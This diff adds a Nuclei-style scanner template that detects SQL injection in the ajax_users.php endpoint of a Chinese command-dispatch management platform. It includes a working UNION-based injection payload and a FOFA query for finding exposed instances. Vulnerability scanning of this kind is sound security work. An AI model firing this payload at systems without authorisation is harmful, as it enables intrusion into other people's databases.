@@ -1,0 +1,28 @@
+id: fjklxtx-ajax_users-sql
+
+info:
+  name: fjklxtx-ajax_users-sql
+  author: lengmo
+  severity: high
+  description: fjklxtx-ajax_users-sql
+  tags: sqli
+  metadata:
+    fofa-qeury: body="指挥调度管理平台"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /app/ext/ajax_users.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
+        Content-Type: application/x-www-form-urlencoded
+ 
+        dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL-- -
+
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body,'c4ca4238a0b923820dcc509a6f75849b') && contains(header,'text/html')" 
